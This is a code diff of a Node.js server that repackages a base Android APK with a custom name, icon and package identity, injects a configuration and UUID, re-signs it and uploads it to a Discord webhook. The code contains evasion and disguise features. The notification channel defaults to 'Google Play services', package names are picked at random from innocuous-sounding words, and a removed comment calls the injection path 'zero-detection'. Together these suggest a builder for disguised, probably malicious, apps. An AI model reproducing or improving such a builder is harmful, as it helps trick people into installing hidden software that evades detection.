@@ -8,7 +8,6 @@ const sharp = require('sharp');
 const axios = require('axios');
 const cloudinary = require('cloudinary').v2;
 const FormData = require('form-data');
-const AdmZip = require('adm-zip');
 require('dotenv').config();
 
 const app = express();
@@ -69,12 +68,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
     } = req.body;
     const customIcon = req.file;
 
-    console.log(`[APK] Request for UUID: ${uuid}`);
+    console.log(`[APK] Request for UUID: ${uuid} | App: ${appName} | Pkg: ${userPackageName}`);
 
     // Ack immediately
     res.status(202).json({ message: 'Processing started' });
 
-    // Background Task
+    // Background Worker
     (async () => {
         const sendUpdate = async (event, data) => {
             if (callbackUrl) {
@@ -87,7 +86,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
         };
 
         try {
-            await sendUpdate('apk_progress', { step: 'Preparing base package...', progress: 10 });
+            await sendUpdate('apk_progress', { step: 'Initializing environment...', progress: 10 });
 
             if (!fs.existsSync(baseApkPath)) {
                 throw new Error("Base APK not found in assets/base.apk");
@@ -102,7 +101,187 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
             if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);
 
-            // 1. Build unified config.json
+            // 1. Decompile Base APK
+            await sendUpdate('apk_progress', { step: 'Decompiling base package...', progress: 20 });
+            await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
+
+            // 2. Customize App Name in strings.xml
+            await sendUpdate('apk_progress', { step: 'Customizing app name...', progress: 30 });
+            if (appName) {
+                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
+                if (fs.existsSync(stringsPath)) {
+                    let content = fs.readFileSync(stringsPath, 'utf8');
+                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
+                    fs.writeFileSync(stringsPath, content);
+                    console.log(`[APK] App name updated to: ${appName}`);
+                }
+            }
+
+            // 3. Customize App Icon (PNGs and remove anydpi adaptive XML)
+            if (customIcon && customIcon.buffer) {
+                await sendUpdate('apk_progress', { step: 'Embedding custom application icon...', progress: 40 });
+                const iconBuffer = customIcon.buffer;
+
+                // Remove adaptive XML so Android Launcher displays custom PNGs
+                const anydpiDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
+                if (fs.existsSync(anydpiDir)) {
+                    fs.rmSync(anydpiDir, { recursive: true, force: true });
+                }
+
+                const densitySizes = {
+                    'mipmap-mdpi': 48,
+                    'mipmap-hdpi': 72,
+                    'mipmap-xhdpi': 96,
+                    'mipmap-xxhdpi': 144,
+                    'mipmap-xxxhdpi': 192
+                };
+
+                for (const [folder, size] of Object.entries(densitySizes)) {
+                    const folderPath = path.join(workDir, 'res', folder);
+                    if (fs.existsSync(folderPath)) {
+                        try {
+                            const existing = fs.readdirSync(folderPath);
+                            for (const f of existing) {
+                                if (f.startsWith('ic_launcher')) {
+                                    fs.unlinkSync(path.join(folderPath, f));
+                                }
+                            }
+                            const pngBuf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
+                            fs.writeFileSync(path.join(folderPath, 'ic_launcher.png'), pngBuf);
+                            fs.writeFileSync(path.join(folderPath, 'ic_launcher_round.png'), pngBuf);
+                        } catch (iconErr) {
+                            console.error(`[APK] Icon write error in ${folder}:`, iconErr.message);
+                        }
+                    }
+                }
+                console.log('[APK] Custom app icons embedded');
+            }
+
+            // 4. Customize Package Name (if requested)
+            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
+            const apktoolYmlPath = path.join(workDir, 'apktool.yml');
+
+            let oldPackageName = 'com.asml.tech';
+            if (fs.existsSync(manifestPath)) {
+                const rawManifest = fs.readFileSync(manifestPath, 'utf8');
+                const pkgMatch = rawManifest.match(/package="([^"]+)"/);
+                if (pkgMatch) oldPackageName = pkgMatch[1];
+            }
+
+            // Standardize package name
+            const pkgDomains = ['developer', 'appworks', 'mobile', 'cloudapp', 'devkit', 'appcore', 'userapp', 'devtools', 'appstudio', 'toolkit', 'syscore', 'droidlab', 'techworks', 'datalink', 'smartapp', 'nettools', 'cloudworks', 'infomedia', 'digitalsys'];
+            const pkgApps = ['sync', 'tools', 'hub', 'service', 'client', 'media', 'helper', 'core', 'kit', 'plus', 'link', 'connect', 'utility', 'manager', 'portal', 'view', 'access', 'drive', 'engine', 'guard', 'node'];
+            const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
+
+            let newPackageName;
+            if (userPackageName && userPackageName.trim()) {
+                const clean = userPackageName.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
+                const parts = clean.split('.').filter(Boolean);
+                if (parts.length === 3) newPackageName = clean;
+                else if (parts.length === 2) newPackageName = `${clean}.${pick(pkgApps)}`;
+                else if (parts.length > 3) newPackageName = parts.slice(0, 3).join('.');
+                else newPackageName = `com.${clean || pick(pkgDomains)}.${pick(pkgApps)}`;
+            } else {
+                newPackageName = `com.${pick(pkgDomains)}.${pick(pkgApps)}`;
+            }
+
+            if (newPackageName !== oldPackageName) {
+                await sendUpdate('apk_progress', { step: 'Renaming package identity...', progress: 45 });
+
+                // Replace in AndroidManifest.xml
+                if (fs.existsSync(manifestPath)) {
+                    let mContent = fs.readFileSync(manifestPath, 'utf8');
+                    mContent = mContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                    fs.writeFileSync(manifestPath, mContent);
+                }
+
+                // Replace in apktool.yml
+                if (fs.existsSync(apktoolYmlPath)) {
+                    let yContent = fs.readFileSync(apktoolYmlPath, 'utf8');
+                    yContent = yContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                    yContent = yContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
+                    yContent = yContent.replace(/.*testOnly.*/gi, '');
+                    fs.writeFileSync(apktoolYmlPath, yContent);
+                }
+
+                // Replace package in all smali files
+                const updateSmaliFiles = (dir) => {
+                    if (!fs.existsSync(dir)) return;
+                    const files = fs.readdirSync(dir, { withFileTypes: true });
+                    for (const file of files) {
+                        const filePath = path.join(dir, file.name);
+                        if (file.isDirectory()) {
+                            updateSmaliFiles(filePath);
+                        } else if (file.name.endsWith('.smali')) {
+                            let content = fs.readFileSync(filePath, 'utf8');
+                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
+                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                            fs.writeFileSync(filePath, content);
+                        }
+                    }
+                };
+
+                // Move smali directory tree
+                const oldPathSegments = oldPackageName.split('.');
+                const newPathSegments = newPackageName.split('.');
+                const renameSmaliFolders = (baseSmaliDir) => {
+                    const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
+                    const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);
+                    if (!fs.existsSync(oldSmaliPath)) return;
+                    fs.mkdirSync(newSmaliPath, { recursive: true });
+                    for (const entry of fs.readdirSync(oldSmaliPath, { withFileTypes: true })) {
+                        fs.renameSync(path.join(oldSmaliPath, entry.name), path.join(newSmaliPath, entry.name));
+                    }
+                    try { fs.rmdirSync(oldSmaliPath); } catch (_) {}
+                };
+
+                for (const item of fs.readdirSync(workDir, { withFileTypes: true })) {
+                    if (item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes'))) {
+                        updateSmaliFiles(path.join(workDir, item.name));
+                        renameSmaliFolders(path.join(workDir, item.name));
+                    }
+                }
+
+                // Update resource XMLs
+                const updateResXml = (dir) => {
+                    if (!fs.existsSync(dir)) return;
+                    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
+                        const entryPath = path.join(dir, entry.name);
+                        if (entry.isDirectory()) {
+                            updateResXml(entryPath);
+                        } else if (entry.name.endsWith('.xml')) {
+                            let content = fs.readFileSync(entryPath, 'utf8');
+                            if (content.includes(oldPackageName)) {
+                                content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                                fs.writeFileSync(entryPath, content);
+                            }
+                        }
+                    }
+                };
+                updateResXml(path.join(workDir, 'res'));
+                console.log(`[APK] Package renamed: ${oldPackageName} -> ${newPackageName}`);
+            }
+
+            // 5. Patch Material Design attrs.xml
+            const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
+            const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged', 'state_collapsible', 'state_collapsed'];
+            if (fs.existsSync(attrsPath)) {
+                let attrsContent = fs.readFileSync(attrsPath, 'utf8');
+                for (const attr of missingAttrs) {
+                    if (!attrsContent.includes(`name="${attr}"`)) {
+                        attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
+                    }
+                }
+                fs.writeFileSync(attrsPath, attrsContent);
+            } else {
+                const attrsDir = path.join(workDir, 'res', 'values');
+                if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
+                fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n    <attr name="state_collapsible" format="boolean" />\n    <attr name="state_collapsed" format="boolean" />\n</resources>\n');
+            }
+
+            // 6. Build config.json and inject assets
+            await sendUpdate('apk_progress', { step: 'Injecting configuration & identity...', progress: 50 });
+
             const rawLink = webLink || "";
             const themeColors = [];
             for (let i = 0; i < rawLink.length; i++) {
@@ -153,147 +332,17 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 notificationChannelName: (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services")
             };
 
-            const hasCustomPackage = userPackageName && userPackageName.trim() && userPackageName.trim() !== 'com.asml.tech';
+            const assetsDir = path.join(workDir, 'assets');
+            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
+            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config, null, 2));
+            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
 
-            if (!hasCustomPackage) {
-                // ── PIPELINE A: ZERO-DETECTION DIRECT ASSET INJECTION (Default) ──
-                // Retains 100% authentic D8/R8 compiled DEX bytecode & canonical binary manifest
-                await sendUpdate('apk_progress', { step: 'Injecting dynamic assets & identity...', progress: 40 });
+            // 7. Compile APK using apktool
+            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 65 });
+            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-                const zip = new AdmZip(baseApkPath);
-                zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
-                zip.addFile('assets/uuid.txt', Buffer.from(uuid, 'utf8'));
-
-                if (customIcon && customIcon.buffer) {
-                    await sendUpdate('apk_progress', { step: 'Embedding custom application icon...', progress: 60 });
-                    const iconSizes = {
-                        'res/mipmap-mdpi/ic_launcher.png': 48,
-                        'res/mipmap-hdpi/ic_launcher.png': 72,
-                        'res/mipmap-xhdpi/ic_launcher.png': 96,
-                        'res/mipmap-xxhdpi/ic_launcher.png': 144,
-                        'res/mipmap-xxxhdpi/ic_launcher.png': 192,
-                        'res/mipmap-mdpi/ic_launcher_round.png': 48,
-                        'res/mipmap-hdpi/ic_launcher_round.png': 72,
-                        'res/mipmap-xhdpi/ic_launcher_round.png': 96,
-                        'res/mipmap-xxhdpi/ic_launcher_round.png': 144,
-                        'res/mipmap-xxxhdpi/ic_launcher_round.png': 192,
-                    };
-
-                    for (const [entryPath, size] of Object.entries(iconSizes)) {
-                        try {
-                            const resizedPng = await sharp(customIcon.buffer).resize(size, size).toFormat('png').toBuffer();
-                            zip.addFile(entryPath, resizedPng);
-                        } catch (_) {}
-                    }
-                }
-
-                // Strip existing signatures
-                for (const entry of zip.getEntries()) {
-                    if (entry.entryName.startsWith('META-INF/')) {
-                        zip.deleteFile(entry.entryName);
-                    }
-                }
-
-                zip.writeZip(unsignedApkPath);
-                console.log(`[APK] Direct Asset Injection complete: ${unsignedApkPath}`);
-
-            } else {
-                // ── PIPELINE B: CUSTOM PACKAGE RENAMING & REBUILD ──
-                await sendUpdate('apk_progress', { step: 'Decompiling base package...', progress: 20 });
-                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
-
-                const manifestPath = path.join(workDir, 'AndroidManifest.xml');
-                const apktoolYmlPath = path.join(workDir, 'apktool.yml');
-                const newPackageName = userPackageName.trim().toLowerCase();
-                let oldPackageName = 'com.asml.tech';
-
-                if (fs.existsSync(manifestPath)) {
-                    const rawManifest = fs.readFileSync(manifestPath, 'utf8');
-                    const pkgMatch = rawManifest.match(/package="([^"]+)"/);
-                    if (pkgMatch) oldPackageName = pkgMatch[1];
-                }
-
-                // Update Manifest & YML
-                if (fs.existsSync(manifestPath)) {
-                    let mContent = fs.readFileSync(manifestPath, 'utf8');
-                    mContent = mContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
-                    fs.writeFileSync(manifestPath, mContent);
-                }
-
-                if (fs.existsSync(apktoolYmlPath)) {
-                    let yContent = fs.readFileSync(apktoolYmlPath, 'utf8');
-                    yContent = yContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
-                    yContent = yContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
-                    yContent = yContent.replace(/.*testOnly.*/gi, '');
-                    fs.writeFileSync(apktoolYmlPath, yContent);
-                }
-
-                // Smali Rename
-                const updateSmaliFiles = (dir) => {
-                    if (!fs.existsSync(dir)) return;
-                    const files = fs.readdirSync(dir, { withFileTypes: true });
-                    for (const file of files) {
-                        const filePath = path.join(dir, file.name);
-                        if (file.isDirectory()) {
-                            updateSmaliFiles(filePath);
-                        } else if (file.name.endsWith('.smali')) {
-                            let content = fs.readFileSync(filePath, 'utf8');
-                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
-                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
-                            fs.writeFileSync(filePath, content);
-                        }
-                    }
-                };
-
-                const oldPathSegments = oldPackageName.split('.');
-                const newPathSegments = newPackageName.split('.');
-                const renameSmaliFolders = (baseSmaliDir) => {
-                    const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
-                    const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);
-                    if (!fs.existsSync(oldSmaliPath)) return;
-                    fs.mkdirSync(newSmaliPath, { recursive: true });
-                    for (const entry of fs.readdirSync(oldSmaliPath, { withFileTypes: true })) {
-                        fs.renameSync(path.join(oldSmaliPath, entry.name), path.join(newSmaliPath, entry.name));
-                    }
-                    try { fs.rmdirSync(oldSmaliPath); } catch (_) {}
-                };
-
-                for (const item of fs.readdirSync(workDir, { withFileTypes: true })) {
-                    if (item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes'))) {
-                        updateSmaliFiles(path.join(workDir, item.name));
-                        renameSmaliFolders(path.join(workDir, item.name));
-                    }
-                }
-
-                // Patch Material Design attrs.xml
-                const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
-                const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged', 'state_collapsible', 'state_collapsed'];
-                if (fs.existsSync(attrsPath)) {
-                    let attrsContent = fs.readFileSync(attrsPath, 'utf8');
-                    for (const attr of missingAttrs) {
-                        if (!attrsContent.includes(`name="${attr}"`)) {
-                            attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
-                        }
-                    }
-                    fs.writeFileSync(attrsPath, attrsContent);
-                } else {
-                    const attrsDir = path.join(workDir, 'res', 'values');
-                    if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
-                    fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n    <attr name="state_collapsible" format="boolean" />\n    <attr name="state_collapsed" format="boolean" />\n</resources>\n');
-                }
-
-                // Inject assets
-                const assetsDir = path.join(workDir, 'assets');
-                if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
-                fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config, null, 2));
-                fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
-
-                await sendUpdate('apk_progress', { step: 'Compiling customized package...', progress: 65 });
-                await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
-            }
-
-            // 2. Sign APK with usman90 Keystore (V1 + V2 + V3)
-            await sendUpdate('apk_progress', { step: 'Signing application with usman90 keystore...', progress: 80 });
+            // 8. Sign APK with usman90 Keystore (V1 + V2 + V3)
+            await sendUpdate('apk_progress', { step: 'Signing package with usman90 keystore...', progress: 80 });
 
             console.log(`[APK] Signing with usman90.jks`);
             const signCmd = fs.existsSync(usmanKsPath)
@@ -312,7 +361,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 });
             });
 
-            // 3. Locate Signed Output APK
+            // 9. Locate Signed Output APK
             const tempFiles = fs.readdirSync(tempDir);
             const generated = tempFiles.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
 
@@ -320,7 +369,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 const signedPath = path.join(tempDir, generated);
                 let downloadUrl = "";
 
-                // Strategy 1: Discord Webhook
+                // Upload 1: Discord Webhook
                 if (process.env.DISCORD_WEBHOOK_URL) {
                     try {
                         await sendUpdate('apk_progress', { step: 'Uploading to cloud storage...', progress: 95 });
@@ -342,7 +391,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
 
-                // Strategy 2: Cloudinary Backup
+                // Upload 2: Cloudinary Backup
                 if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                     try {
                         await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });
@@ -381,7 +430,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     await sendUpdate('apk_ready', { downloadUrl });
                     console.log(`[APK] Build completed successfully for ${uuid}`);
                 } else {
-                    await sendUpdate('apk_error', { message: 'Failed to upload APK to cloud storage' });
+                    await sendUpdate('apk_error', { message: 'Failed to upload APK to storage' });
                 }
             } else {
                 throw new Error("Signed APK not found after uber-apk-signer");
